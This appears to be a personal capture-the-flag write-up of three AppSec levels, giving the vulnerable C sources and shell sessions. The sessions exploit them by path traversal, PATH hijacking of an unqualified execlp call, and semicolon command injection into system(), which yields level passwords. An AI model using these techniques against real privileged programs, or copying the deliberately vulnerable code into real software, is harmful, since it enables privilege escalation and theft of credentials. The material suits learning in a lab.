
scoreboard:
ctf.secureset.com:10000

Linux:
ssh -p 10002 lev1@ctf.secureset.com

Steganography:
ssh -p 10003 lev1@ctf.secureset.com

Appsec:
ssh -p 10005 lev1@ctf.secureset.com

Crypto:
ssh -p 10004 lev1@ctf.secureset.com

Password: password


Appsec:

nulladdr@unknown:~$ ssh -p 10005 lev1@ctf.secureset.com

lev1@SecureSet-CTF-AppSec:~$ cd /var/challenge/level1
lev1@SecureSet-CTF-AppSec:/var/challenge/level1$ ls -al
total 28
drwxr-x---  3 overlord lev1 4096 Mar 22  2018 .
drwxr-xr-x 12 root     root 4096 Sep 13  2017 ..
-rwxr-sr-x  1 overlord lev2 7628 Mar 22  2018 appsec1
-rw-r--r--  1 overlord lev1  941 Sep 13  2017 appsec1.c
drwxr-xr-x  3 overlord lev2 4096 Sep 13  2017 devel
-rw-r-----  1 overlord lev2   13 Sep 13  2017 pass2
lev1@SecureSet-CTF-AppSec:/var/challenge/level1$ ls -l devel/bin/
total 156
-rwxr-xr-x 1 overlord lev2  31376 Sep 13  2017 echo
-rwxr-xr-x 1 overlord lev2 126584 Sep 13  2017 ls

Ok, so need to execute appsec1, group suid to lev2 to dump pass2.

lev1@SecureSet-CTF-AppSec:/var/challenge/level1$ cat appsec1.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pwd.h>

#define PREFIX_DIR "/var/challenge/level"
#define DEVBIN_DIR "/devel/bin/"

int main(int argc, char *argv[])
{
  char *path = NULL;

  if (argc < 2) {
    fprintf(stderr, "Missing command\n");
    exit(1);
  }

  if (strchr(argv[1], '|') || strchr(argv[1], ';') || 
      strchr(argv[1], '`') || strchr(argv[1], '&') ||
      strchr(argv[1], '>') || strchr(argv[1], '<') ||
      strchr(argv[1], '$')) {
    fprintf(stderr, "Command contains prohibited characters\n");
    exit(1);
  }

  if ((path = malloc(strlen(PREFIX_DIR) + 2 + strlen(DEVBIN_DIR) + strlen(argv[1]) + 1)) == NULL) {
    fprintf(stderr, "Out of memory\n");
    exit(1);
  }

  sprintf(path, "%s%d%s%s", PREFIX_DIR, 1, DEVBIN_DIR, argv[1]);
  printf("Executing: %s\n", path);
  execv(path, &argv[1]);

  fprintf(stderr, "Failed to execute command %s\n", path);
  exit(1);
}

It expects at least 1 arg and allocates a path:

  if ((path = malloc(strlen(PREFIX_DIR) + 2 + strlen(DEVBIN_DIR) + strlen(argv[1]) + 1)) == NULL) {
  sprintf(path, "%s%d%s%s", PREFIX_DIR, 1, DEVBIN_DIR, argv[1]);

/var/challenge/level1/devel/bin/ [arg1]

And executes it:

  execv(path, &argv[1]);

lev1@SecureSet-CTF-AppSec:/var/challenge/level1$ ./appsec1 ls $PWD/pass2
Executing: /var/challenge/level1/devel/bin/ls
/var/challenge/level1/pass2

lev1@SecureSet-CTF-AppSec:/var/challenge/level1$ ls devel/bin/../../../../../bin/cat 
devel/bin/../../../../../bin/cat

lev1@SecureSet-CTF-AppSec:/var/challenge/level1$ ./appsec1 ../../../../../bin/cat $PWD/pass2
Executing: /var/challenge/level1/devel/bin/../../../../../bin/cat
mVoZv89wGIP7

Sweet!


nulladdr@unknown:~$ ssh -p 10005 lev2@ctf.secureset.com

lev2@SecureSet-CTF-AppSec:~$ cd /var/challenge/level2/
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ ls -l
total 16
-rwxr-sr-x 1 overlord lev3 7772 Mar 22  2018 appsec2
-rw-r--r-- 1 overlord lev2 1408 Sep 13  2017 appsec2.c
-rw-r----- 1 overlord lev3   13 Sep 13  2017 pass3

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ cat appsec2.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>


int main(int argc, char *argv[])
{
  int pipefd[2];
  pid_t pid;
  int fd;
  int in;
  char c;
  int status;

  if (argv[1] == NULL) {
    fprintf(stderr, "Please specify the file to verify\n");
    return 1;
  }
   
  if ((in = open(argv[1], O_RDONLY)) < 0) {
    perror("open");
    return 2;
  }

  if ((fd = open("/dev/null", O_RDWR)) < 0) {
    perror("open");
    return 5;
  }
  
  if (pipe(pipefd) < 0) {
    perror("pipe");
    return 3;
  }

  if ((pid = fork()) < 0) {
    perror("fork");
    return 4;
  }
  

  if (pid == 0) {
    dup2(pipefd[0], 0);
    dup2(fd, 1); 
    dup2(fd, 2);  

    close(pipefd[1]);
    close(fd);
    close(in); 
    
    execlp("tidy", "tidy", "-asxml", (char *)0); 
    perror("execlp");
    return 5;
  }

  while (read(in, &c, 1)) {
    write(pipefd[1], &c, 1);
  }

  close(pipefd[1]);
  close(pipefd[0]);
  close(fd);
  close(in);

  waitpid(pid, &status, 0);
  
  switch(WEXITSTATUS(status)) {
  case 0:
    printf("OK!\n");
    break;
  case 1:
    printf("Your file is not completely compliant\n");
    break;
  case 2:
    printf("Your file contains errors\n");
    break;
  default:
    printf("I can't tell if your file is XHTML-compliant\n");
  }

  return 0;
}


At first glance, looks like this is what we need to hit:

  while (read(in, &c, 1)) {
    write(pipefd[1], &c, 1);
  }

Back up from there. argv[1] will be the input file:

  if ((in = open(argv[1], O_RDONLY)) < 0) {

Then fd will be /dev/null:

  if ((fd = open("/dev/null", O_RDWR)) < 0) {

Then pipe and fork:

  if (pipe(pipefd) < 0) {

  if ((pid = fork()) < 0) {

Then child will:

  if (pid == 0) {
    dup2(pipefd[0], 0);
    dup2(fd, 1); 
    dup2(fd, 2);  

    close(pipefd[1]);
    close(fd);
    close(in); 
    
    execlp("tidy", "tidy", "-asxml", (char *)0); 
    perror("execlp");
    return 5;
  }

And parent will: 

  while (read(in, &c, 1)) {
    write(pipefd[1], &c, 1);
  }

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ ./appsec2 pass3 
Your file is not completely compliant

So what does dup2() do again?
http://man7.org/linux/man-pages/man2/dup.2.html

       int dup2(int oldfd, int newfd);

       The dup2() system call performs the same task as dup(), but instead
       of using the lowest-numbered unused file descriptor, it uses the file
       descriptor number specified in newfd.  If the file descriptor newfd
       was previously open, it is silently closed before being reused.

alright, so the child redirects STDIN to the pipe
and STDOUT and STDERR to /dev/null

    dup2(pipefd[0], 0);
    dup2(fd, 1); 
    dup2(fd, 2); 

Hang on though, there's no path provided?

    execlp("tidy", "tidy", "-asxml", (char *)0);

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ which tidy
/usr/bin/tidy

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ mktemp -d
/tmp/tmp.JpIU8PunTk
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ ln -s /bin/cat /tmp/tmp.JpIU8PunTk/tidy
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ export PATH=/tmp/tmp.JpIU8PunTk:$PATH
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ which tidy
/tmp/tmp.JpIU8PunTk/tidy

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ ./appsec2 pass3 
Your file is not completely compliant

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ rm /tmp/tmp.JpIU8PunTk/tidy 
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ vim /tmp/tmp.JpIU8PunTk/tidy
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ chmod +x /tmp/tmp.JpIU8PunTk/tidy
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ cat /tmp/tmp.JpIU8PunTk/tidy
#!/bin/bash
cat > /tmp/tmp.JpIU8PunTk/pass3

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ tidy hello
fhdfhdhf
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ cat /tmp/tmp.JpIU8PunTk/pass3 
fhdfhdhf

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ ./appsec2 pass3
OK!
lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ cat /tmp/tmp.JpIU8PunTk/pass3
LJkw2sfYun9I

Score!

lev2@SecureSet-CTF-AppSec:/var/challenge/level2$ rm -r /tmp/tmp.JpIU8PunTk


nulladdr@unknown:~$ ssh -p 10005 lev3@ctf.secureset.com

lev3@SecureSet-CTF-AppSec:~$ cd /var/challenge/level3/
lev3@SecureSet-CTF-AppSec:/var/challenge/level3$ ls -l
total 16
-rwxr-sr-x 1 overlord lev4 7552 Mar 22  2018 appsec3
-rw-r--r-- 1 overlord lev3  516 Sep 13  2017 appsec3.c
-rw-r----- 1 overlord lev4   13 Sep 13  2017 pass4

lev3@SecureSet-CTF-AppSec:/var/challenge/level3$ cat appsec3.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv)
{

	if( argc != 2)
	{
		printf("Usage: %s <input>\n",argv[0]);
		return(1);
	}

	char buf[128];

	if( strchr(argv[1], '|') || strchr(argv[1], '`') ||
		strchr(argv[1], '&') || strchr(argv[1], '>') ||
		strchr(argv[1], '<') || strchr(argv[1], '$'))
	{
		fprintf(stderr, "Command contains prohibited characters\n");
		exit(1);
	}

	snprintf(buf, 129, "/bin/echo %s", argv[1]);

	system(buf);

	return 1;
}

Looks like a good buffer overflow.
Actually not even that! Way easier.

lev3@SecureSet-CTF-AppSec:/var/challenge/level3$ ./appsec3 "pass; cat pass4"
pass
q8lsCudx31t7


